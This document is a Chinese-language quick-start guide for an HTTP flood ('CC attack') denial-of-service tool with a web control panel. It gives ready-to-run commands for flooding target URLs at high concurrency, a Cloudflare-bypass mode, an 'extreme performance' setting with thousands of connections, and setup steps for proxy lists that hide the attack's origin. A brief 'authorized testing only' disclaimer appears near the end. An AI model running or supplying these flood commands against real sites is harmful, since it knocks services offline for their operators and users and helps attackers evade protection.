# 🚀 快速开始指南

## 一键安装使用

### 方法1: 全自动安装
```bash
./setup.sh
```

### 方法2: 快速启动Web面板
```bash
./start_panel.sh
```

## 🌐 Web控制面板

启动后访问：
- **本地**: http://localhost:5000  
- **远程**: http://你的IP:5000

### 面板功能
- 📊 **实时监控**: CPU、内存、网络
- 📝 **任务管理**: 创建、启动、停止任务  
- 📜 **实时日志**: WebSocket推送
- ⏰ **定时任务**: 自动启动/停止

## 💻 命令行快速使用

### 基础攻击
```bash
# 标准CC攻击
python3 main.py cc https://target.com 100 10

# 超负荷模式 (推荐)
python3 main.py cc https://target.com 500 50 --fire-and-forget --overload

# CF绕过攻击
python3 main.py cc https://cf-site.com 100 10 --cf-bypass
```

### 极限性能模式
```bash
python3 main.py cc https://target.com 2000 200 \
  --overload \
  --fire-and-forget \
  --burst \
  --no-delay \
  --max-connections 5000
```

## ⚡ 超负荷模式特点

- **🔥 纯发送**: 不接收响应，RPS提升500%+
- **🏊 连接池**: 智能复用，性能提升300%+  
- **💾 内存优化**: 激进回收，占用减少40%
- **💥 爆发模式**: 动态扩展，峰值性能
- **⚡ 无延迟**: 极限速度模式

## 📡 代理配置

编辑代理文件：
```bash
# SOCKS5代理 (推荐)
echo "your-proxy:1080" >> socks5.txt

# HTTP代理
echo "your-proxy:8080" >> http_proxies.txt
```

## ⚠️ 重要提醒

**仅用于授权的安全测试！**

1. ✅ 获得目标系统授权
2. ✅ 遵守法律法规  
3. ✅ 用于安全研究
4. ❌ 禁止恶意攻击

## 🆘 需要帮助？

- 📖 详细文档: [README.md](README.md)
- 🐛 问题报告: 创建Issue
- 💬 技术支持: 查看故障排除
